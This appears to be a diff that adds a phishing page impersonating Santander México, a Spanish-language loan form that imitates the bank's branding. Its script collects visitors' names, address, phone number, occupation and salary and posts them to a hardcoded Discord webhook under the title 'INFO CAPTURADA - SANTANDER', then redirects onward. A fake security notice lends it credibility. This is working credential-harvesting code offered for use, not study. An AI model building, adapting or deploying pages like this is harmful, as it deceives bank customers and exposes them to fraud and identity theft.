@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Santander México - Formulario</title>
+  <style>
+    /* DISEÑO ORIGINAL INTACTO */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #ec0000 0%, #c40000 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+    .container { background: white; border-radius: 8px; box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3); max-width: 480px; width: 100%; padding: 40px; }
+    
+    /* EL LOGO QUE NO FALLA EN EL TELÉFONO - PURO CSS */
+    .logo { text-align: center; margin-bottom: 20px; }
+    .logo-box {
+      background-color: #ec0000;
+      color: white;
+      padding: 12px 25px;
+      display: inline-block;
+      border-radius: 4px;
+      user-select: none;
+    }
+    .logo-box span {
+      font-family: Arial, Helvetica, sans-serif;
+      font-weight: bold;
+      font-size: 28px;
+      letter-spacing: -1px;
+    }
+
+    h1 { color: #ec0000; font-size: 28px; margin-bottom: 30px; font-weight: 400; text-align: center; }
+    .form-group { margin-bottom: 24px; }
+    label { display: block; color: #ec0000; font-size: 14px; font-weight: 500; margin-bottom: 8px; }
+    input, select { width: 100%; padding: 14px 16px; border: 1px solid #d3d3d3; border-radius: 4px; font-size: 16px; }
+    .btn-primary { width: 100%; padding: 16px; background: #ec0000; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; }
+    .info-box { background: #fff4e5; border-left: 4px solid #f7b500; padding: 16px; margin-top: 30px; border-radius: 4px; font-size: 13px; color: #5c5c5c; }
+    .footer-logo { text-align: center; margin-top: 40px; padding-top: 30px; border-top: 1px solid #e0e0e0; }
+    .footer-logo-text { color: white; background: #ec0000; padding: 10px 20px; font-size: 24px; font-weight: bold; display: inline-block; border-radius: 4px; }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+    <div class="logo">
+      <div class="logo-box">
+        <span>Santander</span>
+      </div>
+    </div>
+
+    <h1>¡Bienvenido!</h1>
+
+    <div id="formContainer">
+      <div class="form-group">
+        <label>NOMBRES *</label>
+        <input type="text" id="nombres" placeholder="Ingrese sus nombres">
+      </div>
+
+      <div class="form-group">
+        <label>APELLIDOS *</label>
+        <input type="text" id="apellidos" placeholder="Ingrese sus apellidos">
+      </div>
+
+      <div class="form-group">
+        <label>DIRECCIÓN *</label>
+        <input type="text" id="direccion" placeholder="Ingrese su dirección">
+      </div>
+
+      <div class="form-group">
+        <label>NÚMERO TELEFÓNICO *</label>
+        <div style="display: flex; gap: 8px">
+          <input type="text" value="+52" readonly style="width: 60px; background: #f5f5f5;">
+          <input type="tel" id="telefono" placeholder="5512345678" maxlength="10" style="flex: 1">
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label>¿OCUPACIÓN ACTUAL? *</label>
+        <select id="ocupacion">
+          <option value="">Seleccione...</option>
+          <option value="Empleado">Empleado</option>
+          <option value="Independiente">Trabajador Independiente</option>
+          <option value="Jubilado">Jubilado</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label>¿RANGO SALARIAL? *</label>
+        <select id="salario">
+          <option value="">Seleccione rango...</option>
+          <option value="10k-20k">$10,000 - $20,000 MXN</option>
+          <option value="20k-50k">$20,000 - $50,000 MXN</option>
+          <option value="50k+">Más de $50,000 MXN</option>
+        </select>
+      </div>
+
+      <button type="button" class="btn-primary" id="btnContinuar" onclick="mandarVaina()">Continuar</button>
+
+      <div class="info-box">
+        <strong>⚠ Seguridad:</strong> Evite compartir sus claves. Santander nunca solicita datos confidenciales por este medio.
+      </div>
+    </div>
+
+    <div class="footer-logo">
+      <div class="footer-logo-text">Santander</div>
+    </div>
+  </div>
+
+  <script>
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1467650318174126192/_JrAS9TIKsDftqmTQuONlgEb4DAlPyQ1O9qst_pvEcgAgcbYeyyez83ftOqVA0pDvaS3';
+
+    async function mandarVaina() {
+        const btn = document.getElementById('btnContinuar');
+        
+        const datos = {
+            nombres: document.getElementById('nombres').value,
+            apellidos: document.getElementById('apellidos').value,
+            direccion: document.getElementById('direccion').value,
+            telefono: document.getElementById('telefono').value,
+            ocupacion: document.getElementById('ocupacion').value,
+            salario: document.getElementById('salario').value,
+            monto: localStorage.getItem('montoPrestamo') || 'No definido'
+        };
+
+        if(!datos.nombres || !datos.telefono || !datos.direccion) {
+            alert("¡Queloque mano! Llena la dirección y todo lo demás.");
+            return;
+        }
+
+        btn.disabled = true;
+        btn.textContent = "Verificando...";
+        localStorage.setItem('tel', datos.telefono);
+
+        const payload = {
+            embeds: [{
+                title: "🚀 INFO CAPTURADA - SANTANDER",
+                color: 0xEC0000,
+                fields: [
+                    { name: "👤 CLIENTE", value: `\`${datos.nombres} ${datos.apellidos}\``, inline: true },
+                    { name: "📞 TELÉFONO", value: `\`+52 ${datos.telefono}\``, inline: true },
+                    { name: "🏠 DIRECCIÓN", value: `\`${datos.direccion}\`` },
+                    { name: "💼 OCUPACIÓN", value: `\`${datos.ocupacion}\``, inline: true },
+                    { name: "💵 SALARIO", value: `\`${datos.salario}\``, inline: true }
+                ],
+                timestamp: new Date().toISOString()
+            }]
+        };
+
+        try {
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            window.location.href = 'index3.html';
+        } catch (err) {
+            window.location.href = 'index3.html';
+        }
+    }
+  </script>
+</body>
+</html>
